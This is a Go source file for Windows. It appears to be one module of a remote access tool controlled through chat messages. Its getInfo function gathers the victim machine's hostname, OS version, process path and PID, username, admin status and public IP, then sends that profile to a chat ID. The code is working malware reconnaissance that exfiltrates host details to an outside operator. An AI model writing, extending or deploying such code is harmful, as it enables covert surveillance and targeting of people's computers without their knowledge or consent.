package main

import (
	"os"
	"io"
	"fmt"
	"os/user"
	"net/http"
	"golang.org/x/sys/windows"
)


func getInfo(chatID int64) {
	infoStr := ""
	
	// Hostname
	hostname, err := os.Hostname()
	if err == nil {
		infoStr += "Hostname: " + hostname + "\n"
	}

	// OS version
    maj, min, patch := windows.RtlGetNtVersionNumbers()
    infoStr += fmt.Sprintf("OS Version: Windows %d.%d.%d\n",  maj, min, patch)

	// Current process path + PID
	exePath, err := os.Executable()
	if err == nil {
		infoStr += fmt.Sprintf("Process: %s (PID: %d)\n", exePath, os.Getpid())
	}

	// Username
	currentUser, err := user.Current()
	if err == nil {
		infoStr += "Username: " + currentUser.Username + "\n"
	} 

	// Is elevated
	infoStr += fmt.Sprintf("Is elevated: %t\n", isAdmin())

	// Public IPV4
	publicIP, err := getPublicIP()
	if err == nil {
		infoStr += "Public IPV4: " + publicIP + "\n"
	}

	SendMessage(chatID, infoStr)
}

func isAdmin() bool {
	var sid *windows.SID

	_ = windows.AllocateAndInitializeSid(
		&windows.SECURITY_NT_AUTHORITY,
		2,
		windows.SECURITY_BUILTIN_DOMAIN_RID,
		windows.DOMAIN_ALIAS_RID_ADMINS,
		0, 0, 0, 0, 0, 0,
		&sid)

	admin, _ := windows.Token(0).IsMember(sid)

	return admin
}

func getPublicIP() (string, error) {
	resp, err := http.Get("http://api.ipify.org")
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	ip, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	return string(ip), nil
}